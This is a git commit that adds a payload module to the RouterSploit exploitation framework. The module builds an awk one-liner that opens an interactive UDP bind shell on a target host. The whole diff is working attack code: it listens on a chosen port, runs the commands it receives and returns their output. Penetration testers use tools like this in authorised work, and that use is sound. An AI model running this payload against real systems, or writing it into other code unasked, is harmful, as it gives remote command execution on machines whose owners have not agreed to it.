d2030a7d436d38dd0a130b89ed7f00154dd92a5b
Marcin Bury <marcin.bury@reverse-shell.com>
2018-06-11 20:30:19 +0200

    AWK UDP Bind Shell Payload (#460)
    * Adding AWK UDP Bind Shell
    
    * Fixing to ident

---
+++ routersploit/modules/payloads/cmd/awk_bind_udp.py
@@ -0,0 +1,23 @@
+from routersploit.core.exploit import *
+from routersploit.core.exploit.payloads import BindTCPPayloadMixin, GenericPayload
+
+
+class Exploit(BindTCPPayloadMixin, GenericPayload):
+    __info__ = {
+        "name": "Awk Bind UDP",
+        "description": "Creates an interactive udp bind shell by using (g)awk.",
+        "authors": (
+            "Marcin Bury <marcin[at]threat9.com>"  # routersploit module
+        ),
+    }
+
+    cmd = OptString("awk", "Awk binary")
+
+    def generate(self):
+        return (
+            self.cmd +
+            " 'BEGIN{s=\"/inet/udp/" +
+            str(self.rport) +
+            "/0/0\";for(;s|&getline c;close(c))" +
+            "while(c|getline)print|&s;close(s)}'"
+        )
